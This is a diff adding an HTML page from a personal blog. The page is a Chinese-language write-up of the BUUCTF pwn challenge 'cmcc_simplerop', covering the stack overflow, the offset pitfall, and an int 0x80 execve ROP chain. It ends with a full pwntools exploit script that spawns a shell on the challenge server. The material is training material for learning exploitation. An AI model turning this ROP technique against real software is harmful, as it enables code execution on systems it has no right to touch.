@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BUUCTF Pwn Cmcc_simplerop | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BUUCTF Pwn Cmcc_simplerop</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/05/18</h2>
+</div>
+
+<main>
+<h1 id="buuctf-pwn-cmcc_simplerop">BUUCTF Pwn Cmcc_simplerop</h1>
+<p>考点</p>
+<p>1、ret2systemcall</p>
+<p>2、rop</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200518165649806.png" alt="image-20200518165649806"></p>
+<p>明显的栈溢出</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200518165743419.png" alt="image-20200518165743419"></p>
+<p>只开启了NX，程序中没有system和/bin/sh，但是存在int 0x80中断可以执行系统调用，可以用其来构造execve(0xb,&quot;/bin/sh&rdquo;,0,0)，bss段可以写可读，可以rop链调用read写入&rdquo;/bin/sh\x00&quot;到bss</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200518170231484.png" alt="image-20200518170231484"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200518170256836.png" alt="image-20200518170256836"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200518170157608.png" alt="image-20200518170157608"></p>
+<p>execve(0xb,&quot;/bin/sh&rdquo;,0,0)的参数从左往右依次传入eax、ebx、ecx、edx，找满足条件的gadget</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200518170615314.png" alt="image-20200518170615314"></p>
+<p>本题栈偏移存在个坑点</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200518165649806.png" alt="image-20200518165649806"></p>
+<p>v4到ebp的offset 0x14，再加上存在leave指令需要覆盖ebp的0x4 = 0x18，但是用pattern测试实际offset是0x20</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200518171135340.png" alt="image-20200518171135340"></p>
+<p>exp</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>
+
+<span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>R:
+	sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">26098</span>)
+<span style="color:#66d9ef">else</span>:
+	sh <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./simplerop</span><span style="color:#e6db74">&#39;</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./simplerop</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#75715e">#fakerebp = 0x4</span>
+<span style="color:#75715e">#offset = 0x14 + fakerebp</span>
+
+int80_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0806eef0</span> 		<span style="color:#75715e">#0x080493e1</span>
+pop_eax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080bae06</span>
+pop_edx_ecx_ebx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0806e850</span>
+read_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">read</span><span style="color:#e6db74">&#39;</span>] <span style="color:#75715e">#0x0806cd50</span>
+bss_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080eaf80</span>
+<span style="color:#66d9ef">print</span> hex(read_addr)
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
+<span style="color:#75715e">#这里然read的返回地址为pop_edx_ecx_ebx是为了清空栈空间，从而能继续push系统调用需要的参数</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(read_addr) <span style="color:#f92672">+</span> p32(pop_edx_ecx_ebx)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(bss_addr) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x8</span>)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(pop_eax)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0xb</span>)<span style="color:#f92672">+</span>p32(pop_edx_ecx_ebx)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p32(bss_addr)
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(int80_addr)
+
+sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your input :</span><span style="color:#e6db74">&#34;</span>,payload)
+sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">cat flag</span><span style="color:#e6db74">&#34;</span>)
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200518171423633.png" alt="image-20200518171423633"></p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
